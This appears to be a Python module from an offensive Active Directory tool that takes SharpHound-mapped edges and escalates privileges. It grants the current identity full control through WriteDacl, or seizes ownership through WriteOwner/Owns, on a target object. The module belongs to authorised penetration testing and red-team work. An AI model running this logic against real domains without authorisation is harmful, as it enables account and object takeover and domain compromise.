"""Compatibility handlers for structural SharpHound edges."""

import logging

from .shared import PrivescActions


class StructuralModule:
    def __init__(self, engine):
        self.engine = engine
        self.actions = PrivescActions(engine)

    # WriteDacl / WriteOwner / Owns are structural privilege abuse.
    def execute(self, rel, context) -> bool:
        # Abuses WriteDacl on the target object by adding full control for the current identity.
        # Abuses WriteOwner on the target object by taking ownership as the current identity.
        # Abuses Owns by taking ownership, then using that control path like WriteOwner.
        start_node, end_node = self.actions.get_edge_nodes(rel)
        target = end_node.get("distinguishedname") or end_node.get("name") or start_node.get("distinguishedname") or start_node.get("name")
        if not target:
            logging.error(f"STRUCTURAL: could not resolve target for {rel.type}.")
            return False

        target_dn = target if str(target).upper().startswith("CN=") else self.actions.resolve_distinguished_name(target)
        if not target_dn:
            logging.error(f"STRUCTURAL: could not resolve DN for {rel.type}.")
            return False

        current_auth = context.get_current_auth()
        current_identity = current_auth.get("username")
        current_sid = self.actions.get_object_sid(current_identity)
        if not current_sid:
            logging.error(f"STRUCTURAL: could not resolve SID for current identity on {rel.type}.")
            return False

        if rel.type == "WriteDacl":
            return self.actions.grant_full_control(target_dn, current_sid)

        if rel.type in ("WriteOwner", "Owns"):
            return self.actions.set_owner(target_dn, current_sid)

        logging.info(f"STRUCTURAL: {rel.type} -> {target_dn}; no direct exploit mapped yet.")
        return True
